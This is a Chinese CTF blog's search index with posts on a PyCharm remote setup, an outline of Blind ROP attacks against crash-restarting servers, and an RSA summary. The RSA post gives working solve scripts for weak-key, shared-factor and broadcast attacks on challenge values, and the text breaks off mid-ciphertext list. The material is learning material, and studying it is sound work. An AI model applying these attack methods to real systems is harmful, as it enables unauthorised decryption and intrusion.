<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[使用PyCharm打造舒适的pwn环境]]></title>
    <url>%2F2019%2F07%2F29%2Fpycharm%2F</url>
    <content type="text"><![CDATA[前言 弄了一天的vim+xshell，结果还是不尽人意，spacevim要求终端支持真彩色，但是xshell显然⑧行，将enable_guicolors设置为false后才勉强能看。 于是突发奇想，将pycharm通过ssh连接到虚拟机当中的python环境，能不能直接在主机上面写脚本调试，查了下还真有这个功能，不过需要pro版本。 准备工作 PyCharm Pro VMware Workstation 科学上网 配置 主题 File-&gt;Settings..-&gt;Plugins，安装Material Theme UI，接着按照自己喜欢的来配就行 配置SSH Interpreter 安装好PyCharm Pro之后，创建一个项目，创建好之后找到File-&gt;Settings..-&gt;Project: ctf-&gt;Project Interpreter配置python解释器 1564413576995 选择Add..-&gt;SSH Interpreter 1564413654784 将虚拟机的ip地址和用户名填写到相应的地方，然后NEXT。 填写密码 1564413731448 设置解释器路径和文件同步位置，然后FINISH 1564413752526 FINISH之后PyCharm会先进行一次同步，同步python库，并且把一些配置文件什么的给传过去，时间略长。 PyCharm的同步还有版本对比功能 1564414108066 不得不说比预想中还要好用。 配置hexo File-&gt;Settings..-&gt;Tools-&gt;Terminal中可以设置PyCharm的终端 将Start directory设置为hexo根目录 shell path可以直接填写终端名称，例如powershell.exe Tab name，标签名称，随便修改。 1564414405852 这样就可以随时进行hexo的相关操作了。 配置SSH Terminal File-&gt;Settings..-&gt;Tools-&gt;SSH Terminal 1564414758329 Deloyment server中选择root@xxx.xxx.xxx.xxx:22 这样每次打开就不需要再选一次了。 总结 pro版本还是好用，配置好之后，直接在一个窗口中进行所有操作，不需要几个窗口之间来回切了，方便了不少。]]></content>
      <tags>
        <tag>IDE</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BROP(Blind ROP)]]></title>
    <url>%2F2019%2F07%2F28%2FBROP%2F</url>
    <content type="text"><![CDATA[BROP 原理 BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行远程攻击，劫持该应用程序的控制流 攻击条件 源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。 服务器端的进程在崩溃之后会重新启动，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。 基本思路 通过暴力枚举判断栈的长度 读取栈上的内容，有canary的话也可以直接爆破 寻找stop_gadget，所谓stop gadget一般指的是这样一段代码：当程序的执行这段代码时，程序会进入无限循环，这样使得攻击者能够一直保持连接状态。 获取brop_gadget，通过构造栈的布局来寻找可用的gadget。 寻找puts@plt 寻找puts@got 构造payload]]></content>
  </entry>
  <entry>
    <title><![CDATA[栈迁移的相关操作]]></title>
    <url>%2F2019%2F07%2F28%2Fframe-faking%2F</url>
    <content type="text"><![CDATA[]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA总结]]></title>
    <url>%2F2019%2F07%2F10%2Frsa%2F</url>
    <content type="text"><![CDATA[RSA介绍 RSA 加密算法是一种非对称加密算法。在公开密钥加密和电子商业中 RSA 被广泛使用。RSA 是 1977 年由罗纳德 · 李维斯特（Ron Rivest）、阿迪 · 萨莫尔（Adi Shamir）和伦纳德 · 阿德曼（Leonard Adleman）一起提出的。RSA 就是他们三人姓氏开头字母拼在一起组成的。 RSA 算法的可靠性由极大整数因数分解的难度决定。换言之，对一极大整数做因数分解愈困难，RSA 算法愈可靠。假如有人找到一种快速因数分解的算法的话，那么用 RSA 加密的信息的可靠性就肯定会极度下降。但找到这样的算法的可能性是非常小的。如今，只有短的 RSA 密钥才可能被强力方式解破。到 2017 年为止，还没有任何可靠的攻击 RSA 算法的方式。 基本原理 公钥与私钥的产生 随机选择两个不同大质数 \(p\) 和 \(q\)，计算\[N=p×q\] 根据欧拉函数，求得 \(\varphi (N)=\varphi (p)\varphi (q)=(p−1)(q−1)\) 1 选择一个小于\(\varphi (N)\) 的整数 \(e\)，使 \(e\) 和 \(\varphi (N)\)互质。并求得 \(e\) 关于$ (N) $的模反元素，命名为 \(d\)，有 \(ed \equiv 1\ (mod\ \varphi(N))\)，即\(ed-1\)能被\(\varphi (N)\)整除。2 将 \(p\) 和 \(q\) 的记录销毁 对明文\(m\)进行加密：\(c = pow(m, e, N)\),可以得到密文\(c\)。 对密文\(c\)进行解密：\(m = pow(c, d, N)\),可以得到明文\(m\)。 使用到的字母： \(p\) 和 \(q\)：两个大的质数，是另一个参数N的的两个因子。 \(N\)：大整数，可以称之为模数 \(e\) 和 \(d\)：encryption key (public key) (又称加密指数)和decryption key (private key) e对于(n)的模反元素 \(c\) 和 \(m\)：密文和明文 \((N, e)\)：公钥 \((N, d)\)：私钥 \(pow(x,y,z)\)：计算\(x^y\ mod\ z\) 工具 RSAtool 安装 123git clone https://github.com/ius/rsatool.gitcd rsatoolpython rsatool.py -h 生成私钥 1python rsatool.py -f PEM -o private.pem -p 1234567 -q 7654321 openssl 查看公钥文件 1openssl rsa -pubin -in pubkey.pem -text -modulus 解密 1openssl rsautl -decrypt -inkey private.pem -in flag.enc -out flag 更加具体的细节请参考 openssl --help。 分解整数工具 网站分解，factor.db 命令行分解，factordb-pycli，借用 factordb 数据库。 yafu python库 primefac 整数分解库，包含了很多整数分解的算法。 gmpy gmpy.root(a, b)，返回一个元组 (x, y)，其中 x 为 a 开 b 次方的值，y 是判断 x 是否为整数的布尔型变量 gmpy2 安装时，可能会需要自己另行安装 mfpr 与 mpc 库。 1234567891011import gmpy2gmpy2.gcd() # 欧几里得算法，用于计算两个整数a,b的最大公约数。gmpy2.gcdex() # 扩展欧几里得算法p = gmpy2.mpz(258631601377848992211685134376492365269) # 初始化一个大整数q = gmpy2.mpz(286924040788547268861394901519826758027)e = gmpy2.mpz(65537) n = p*q # 74207624142945242263057035287110983967646020057307828709587969646701361764263m = gmpy2.mpz(0x666c61677b746573747d) # 明文，flag&#123;test&#125;c = gmpy2.powmod(m, e, n) # 加密，密文：29766627188948515299752891165088038848853967387353164719200436253350322889530d = gmpy2.invert(e, (p - 1) * (q - 1)) # 计算e相对于\varphi (n)的模反元素flag = hex(gmpy2.powmod(c, d, n))[2:].decode("hex") # 得到flag，flag&#123;test&#125; pycrypto Ubuntu 安装 1sudo pip install pycrypto 使用 12345678910111213141516import gmpyfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_v1_5msg = 'crypto here'p = getPrime(128)q = getPrime(128)n = p*qe = getPrime(64)pubkey = RSA.construct((long(n), long(e)))privatekey = RSA.construct((long(n), long(e), long(d), long(p), long(q)))key = PKCS1_v1_5.new(pubkey)enc = key.encrypt(msg).encode('base64')key = PKCS1_v1_5.new(privatekey)msg = key.decrypt(enc.decode('base64'), e) Windows 安装 1pip install pycryptodome 使用 用法同pycrypto 1rsa =RSA.construct((n,e,d,p,q)) 题目类型 模数分解 这类题目就是给个\(N\)、\(e\)、\(c\)什么的，算出其他需要的值 例题 rsarsa 123456p = 9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483q = 11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407e = 65537c = 83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034Use RSA to find the secret message \(p\)，\(q\)都给了，直接用gmpy2.invert(e,(p-1)*(q-1))算出\(d\)，再用gmpy2.powmod(c,d,n)就可以得到flag了 解密脚本 1234567891011import gmpy2p=gmpy2.mpz(9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483)q=gmpy2.mpz(11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407)n=p*qe=gmpy2.mpz(65537)d=gmpy2.invert(e,(p-1)*(q-1))c=gmpy2.mpz(83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034) flag=gmpy2.powmod(c,d,n) 低加密质数攻击 在RSA中e也称为加密指数。由于e是可以随意选取的，选取小一点的e可以缩短加密时间，但是选取不当的话，就会造成安全问题。 e=3时的小明文攻击 当\(e=3\)时，如果明文过小，导致明文的三次方仍然小于\(n\)，那么通过直接对密文三次开方，即可得到明文。 即： \[c\equiv m^e\ mod\ n\] 如果e=3，且$ m^e&lt;{n} $，那么： \[ c= m^e,\ e=3\] \[ m = \sqrt[3]{c}\] 如果明文的三次方比n大，但是不是足够大，那么设k，有： \[ c= m^e+kn\] 爆破k，如果$ c-kn $能开三次根式，那么可以直接得到明文。 例题 123n: 0x81cfc71c44c83faf3c5242fa81ae2e533fc945f3bef30bc13323ea4a55b3debc11301c6a9ecb8f7ef92fa169b157435af728a145497f2cdf75b3007b9732da4c47d67683f09ae1edc8f698f5ec7549593d9f1d06adafae4ad09514928bf0367a2719f7c171580318690dafc6a3d5385b3516b769f529c0a055ce25e68bc21395Le: 0x01c: 0x6867616d657b7273615f31735f737469316c5f653473795f6e6f77217dL 因为\(e=1\)，根据上面的结果，\(c=m^1=m\)，直接将\(c\)解码即可得到flag 多个n有公约数分解 如果在两次公钥的加密过程中使用的\(n_1\) 和\(n_2\)具有相同的素因子，那么可以利用欧几里得算法直接将\(n_1\)和\(n_2\)分解。 利用欧几里得算法解出最大公约数\(p\) 12345678def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return a 例题 1234567n is 28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181e is 65537c is 14200655400630956617529154837540349350095534430543196299987252783320359338882400858000649938298574946882176873795065987640380185922571487987903069796872680567596754211592988768630729844485795253975027297563832927176988502771266530781452168489731952873297707254669904609865565861351429459102567318447934677565870915603816516557032164955329497823771897899211076176905132170360842951444390670253036307048815943908305457043184642918674003085039564350070641592716116089015861491205237748561298604957423077954850396167621218521884114394431799317165818964438359695744604198246716410783223931430682808151056020475306791729591n is 29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613e is 65537c is 4578343924026570978472440931890325318245466288503599188533732998304051832656861172828218449138067382663459418589454854723253403947485557649615240187148291946554256687236506349553390057789720132702311963022032912389266835192465297150080916409872411988524410949952643478505491642457481045586019802683635095575472601541635397816830552539347027587330022646372943452066068029168471475125499435879399193076604330172042202401974524486727842888375820659903161039255979785711025431762267505041403586092799995451754527655054098031095440553010856162282818464431911828926227552966047893177859591679867661412947560702301353393344 1234567891011121314151617def gcd(a, b): if a &lt; b: a, b = b, a while b != 0: temp = a % b a = b b = temp return an1 = 28989197955870674811941817152881961892555962828020048566215146047714999804743571465320756664500939106612607504133407755470924915037883788416084924998195415611009578161228226056524027626453567996030151847302248848345942762209886902216532270655286303624781479379460319335849225128417295447574269158603952744753408534894136230960676590980945838733350143370605144754932401806068003166087495356366335014736018745371974324955357717635855207674309628146381030418983172039685916675081977078212813718313201568394044637347955108623458947913411108888733982376607647705302281273170230540579872437433435253235534772724624778056181n2 = 29703811006265969568420235185761287243393105045336995893094671661145408859269297497044834735198371987472186770953203812235003929122122129964989222762478116003185582578013431109127657242169359697936471497781547555222392181694624446976869099519331688628488881595076878345856808384797954271081176432330698334469596003760530797898645529616535584139559768170011693043197581376652770244664582733792825511473683193195672487559140733668442863818306947800631472845430628311685792799840854080385208783178691512540436222290062939858472754953657763052720510548438848633979413756332920634307585878271699119574149435107725143578613p = gcd(n1,n2)print p,"\n\n",n1 // p 解出\(p\)，\(q\)，egcd取d，pow求m。 低加密指数广播攻击 如果选取的加密指数较低，并且使用了相同的加密指数给一个接受者的群发送相同的信息，那么可以进行广播攻击得到明文。 即，选取了相同的加密指数e（这里取e=3），对相同的明文m进行了加密并进行了消息的传递，那么有： \[ c_1\equiv\ m^e\ mod\ n_1\] \[ c_2\equiv\ m^e\ mod\ n_2\] \[ c_3\equiv\ m^e\ mod\ n_3\] 对上述等式运用中国剩余定理，在\(e=3\)时，可以得到： \[ c_x \equiv m^3\ mod\ n_1n_2n_3\] 通过对\(c_x\)进行三次开方可以求得明文。 例题 123456789101112131415161718192021222324252627282930313233343536373839n is 17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149e is 10c is 4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416n is 21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577e is 10c is 4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689n is 30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761e is 10c is 12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923n is 18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277e is 10c is 4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831n is 27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129e is 10c is 18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506n is 22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793e is 10c is 19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909n is 20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501e is 10c is 2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466n is 21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273e is 10c is 9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926n is 23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821e is 10c is 17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242908563699707272843032773107477368790419109907271096351457526240471975122296483655337150130000812813081239181653384419149292970320991892073352340649237387406498087734708162094476092368665794350968924289259192893289337038201504066310173284757044802449600666007821509553n is 27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257e is 10c is 8597067880812456123669594978660135058668875834924201279924162761020137582662367704504988576614934966062323191666982943113656186783894245035267051756178331490881264629774635620179678000947771928854566239213498586078670870127924696459041295848474073879336501325437194563845414699360564571136683492426292766799121155041276162673427700999761055592609213603158576637212003771003996722743170543342885011289692845493598413965688949325670519743413071479057382602222055902593614159427186017797992219490308930116850084553033461316509457834436420821916094206010206229370273622681413176347187252950087428868295965528772832409316 解密脚本 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import gmpydef my_parse_number(number): string = "%x" % number erg = [] while string != '': erg = erg + [chr(int(string[:2], 16))] string = string[2:] return ''.join(erg)def e_gcd(a, b): x,y = 0, 1 lastx, lasty = 1, 0 while b: a, (q, b) = b, divmod(a,b) x, lastx = lastx-q*x, x y, lasty = lasty-q*y, y return (lastx, lasty, a)def chinese_remainder_theorem(items): N = 1 for a, n in items: N *= n result = 0 for a, n in items: m = N/n r, s, d = e_gcd(n, m) if d != 1: raise "Input not pairwise co-prime" result += a*s*m return result % N, Ne=10n=[17551188754807399016342420221734945766749930201727412345251590531404061480740932995199065332987719183197199448336435851015540272155441486746027315107821340969105623451575872580170978368650593880274076025520453956378539766228430429142117994616985318963125739076826635459215114946159348678398268099389525414431618517743889314085714390430972783223270985688988995257770363117225472590084489120958397189130958462784532637453482182763505791720641422686749616216521724012108378680177131928438795893866425040489551258902610047574579899692834984999209528110849342042529825594061894238371591910354584305136154355365191215400149,21840437284422601584177601857355845296420300157767339109572377640408362726674561246210400400760474187121246893712480109326893614162779470768415282900713800983815570602250068673695044749932532689851310770087552524620857623442019428044482787965428075984951982104920901562456426672111590909100736209153905853035127247720276974050404663847547090362780729077829594684995979457326414947449083219461617302643392904522733812903141301332227357689517880801845510579518887472928083718826890369016944549160461428710615747001273521253638766267143341819170249648385341127263707417642925464809788975715332938666417316695941347477577,30015914133986758133105015082922460910471726819000479872816812806794140887209294393963063273377891203069864711466776200108173672428779293308320460116493040572826915020654293929241843686728296387400110062099074573009645563520805301899962344680821396200256042478539540675850427377958553324581371362112652752444824919601767821622038488365501031636558236126052654241662743070651213369566898998898634441261811655053789384588711547685939927721116404429914329081432990913321296964957260691148704710581681774562904924080813274984809940008968629515304859518629473284018332651831587916402539386242421630250537030688162675751761,18009718435825445649372629634867772247035138229493108362713630947680338354227735572070882390378632440365163117094233413520107070581908224239210969172094402760924055334584259678276505919418191623762998249724248379302786621689049107500760348303940112840664926231345646325964133281550765454719628161600475143792567309947330130747860125557547051843620899629217636918002929846463097841539446014019579830347356084080488561917440356848465812937246809018168582635191619622041079012450531811237168105634382108634135880887093525611263186925213027913337454706919754923593714509998062073450679720905569489304398625255143801533277,27090736422393991189249636552945539144039087911497773160371557650625344533254580764344628540515132884576739746597729079146155130899009238110101654711303800340566538298798432929136509923129089904647023409146264405964139002638684510681372633714179570768685640570209727600215295330846361754314973731753734397312932947433225732597524076563605729037998272803472953079912899867244318073144564355326520230078681106746670895643454939714423661018216469020021429142336238301775948794784776906058601395026463842070755547793192470653204078222827768950823747061655106900276571547680451953562314376913592896427730473091360051391129,22277916445389799876692954866506052125036892596099795492064670519272419621528759837318253665292779127861537748967309681231938516330289846519214661138299205082421968922350230121526530080908053297879027158545040193774647350499415863211113776785399848472712293535289113810322398103983587423306282629848367328743089145940536913390664697321526306054579656600439140061667264516070003507841618352122567379038304294976725469305215682426898731699093794930417366769249256999177339843020364367769712776225743916112170787273891225926246407201080202593858063362565931942590349178361085396799890148505959437244983447934838792051793,20851005254704933958354817552975190588383962843827122226904964048318053243049822277049715505735762051530592940514007687138882551369906711787133432792478447465241409449145625470766867280545673313710877827491010966285871747638401315338616986782370641881615238434667687936400955629642629748987839996011550408156162317201139746453148874558603034756902297066835592748562014100033050736650359512497633206350878620421058840864178654150287452573363251543090733404389037241843869379543719804499640600546216051812575335078292203435075056740907356476508423562893159958041443951220933694064510275964264723600894558623421819904501,21745680718194037861694569863678082853797244380310200176477643943644972463871360669070584682807703870684830948023158889780219716829353665600564791257912082043905122048004593803193375178269942973208249276102769671038752489438400731535367257356207098737711096953679231300720903502192144476519811856646400822239966219746455729409375771797064825552958482297097797911599808242875799342438899636328763766908154658738969614707377852147843953614178305416594819846812426828300689497046389665982817209315784313108617753052015326937047712513569322963102500122038505770232917473260057408981125469607573191926134043719437868156273,23257483042331781031320004066395973098539881870433034498180628292164825476845647596122889756396987220787263478778647199033523248861079487991256044473644515960559630792146394039814096408486541588067643811077716428015000310006227815563853161604153799667073262886506475792902392829571472354691875108497532721686076971371510238161060553858839091026451266521753830084143245517459861325880906431205328541736948784727909518259034781432825317588016829248046749554245422672923121452470552323438808591118050034108325754535134236727740460190849252647561826203675666601441506024780605194340777802389960180532831878689458096046821,27637004622327338030988157906180324667829916751358977640832765328645718696385482091781513197472066052101704131751158627239657425473994441143385613105528200215275110466263289952962400664293602133856809475295970322767309563273999319926150648399522508592521685688896842833243324070987594588134776515978198364901455727292006058624015674914131447232032058875410956114939938460192876157612457774033922125553271809409381181134668696682847583314698759337802814876161751333701826176655372126746717533228292189928645064111959824895679517476699556313948724818860906006774808944802984477517788391260149504822396276593451707118257]c=[4675182605549711347653299514777826238559040200527747810846901991433127025723361807211672208052862870258047285285949212515664278410499603829663266213968511493974766674071825225536665267049044619340378438531615983696406305841945756396579371794826265549929503043134668360055027276522368879193620937457881486509311711905722483187734650127796510808637890189952840971330768913946884525594627652458745930532219238258911608744112001798136394806004726472890838481881026716605743812674350955258003794590748258523929460446986020794445478076559635145181909093786617716473870604463315696183050495143502762614767485881979217577416,4586033930015814975553487614321341290358072960539564849589758593801587823414394351862074093343255479635303199078561905260793645869942622136164615776822867275172888812989071016687658023005838776181437470204528335444413852561895603377955959308318399246963213964044984235974352824060625970587119586612774322385216810264819426458641852166009899106655036755913322283219739741020656812034348404092018340277026844114272699170323014050087289715403989671918767712613414346320222745328800096615947138667139053339483278319521201983885423491905171167675501563556563890821756892474999549635650486944010346554641603343238490572689,12012575342366442210994368605032582129674485327006093552902983877957202172783938071684841031902396156899396879136388606996807608296316795628987877357547213450360953742947781700549506469226564975927361748596520878542651668963131021269851928174681007347771519569914690980744941965086762285630082781013781879511681353119117280354102271439057204066405072328422057721895983540492150402309552609035008272366176657384174081229798739099558539083074489500359062010164358300087124447037922844709870430218019673914305742939927888838599616520300011913022792060392260618046807788302643742874847024153198113792628046678578753632923,4249005911324898630458723491151576810198619078332972911420166645127258598519950448507640904379342817486426262054889199369385257812524759761245588973651578211291344326619317559377360319507727729535083143293335799588196976241949218037833747839545295030259115279668065886560417877204054684495047181117075603468672292268831273735956964067626837975218539840667641885621426607941950306330198897187683754687379611844278471572791816397950634388907233312117920634807989734011132718334334850592111651631323130933438007008983489782601827321396168104668493332626558911838721998173148508994771473224050827471186478106896949413831,18557109853898405974924769550105345673703067457537813607252151469933140760798378574244439559372100428971400070351173140348823652755825601433268832363575896137364288069984314151346137206115518309597389268875150549696376813277778514591532615794294637044626683931367510181612383681914421702261592233265455950023252407680604041046629667703207133146853618989187597749132650514038584280417791134426596848369417626039533740827554552117727501565841065077835398951826747855393552731497438983274201599740189743630949174610722118659019630964669901438690028070213710833335622573526403588737092869273969581607637522572757015237506,19221531342713801219971420455098666365124810169512711030444063942333694562364114172361552139176582476168134219937393468391346535097965763785916484012657401095066804857900941482772687159471483908107669892419626059680168762119954068288719303591498504050604628627299671160225276355636519961578118413913001058744164531470610279168723402009469959377794138715204862239973561494796213624769358906726186769711689962808937828553399403173762034548974335960107700638910231658795639167906700770120741974418495196827830462542130080965552102416180517600397897065113788279096066792533807104187868678848857780735334749865813019681909,2043866718532927301454127017521835945401727173760352488220517028498861777262807036566165189285730569375083406234212921588654098421290088269551352101830688429903600880691046607902396566775005694148315605616437713115424223594710186677844867273218443350479253279231960061845711898262461185970057002138523262952260834191169438764964758526877361442277664448596129451496415695776781879266732057920583336999766633938582656240607973759756021032489262381190762825081392613689817792764844409877116240223852376311404164963595040347176139494461319495285348608562589901671620063620688524249523700500144604558899272202564535295466,9018406452041117867927204674649220929160509942604290572303644183451237944912470236367308266319079349289625873447647200474598755869642999213142758825809522474810817609751187533346902667225032452694187162262683056445775455963994237202296104812386374636270188433521927503415507963477240913270879794141170568393025367891003921090015993944946205723601349149601256727433716155121883420271498265967234259068535172501445643752691860997480636101699340740265505767091920668218018002976632111256430655619061247292025654740889077014179258647084698229733160071306390020603636210736363198302407289195286953980520285032528614492926,17978671919734595201524186618868659656036765546673883938819333911564948587858876495802600244078413312462813938682090761599961604959609423010904187720748539707172853352540370208991902929002036775381503365170196838626379685712050728875172622632447875368166743751159775611642629408534890684109652648484868876710697249351895355111511281037497347712241242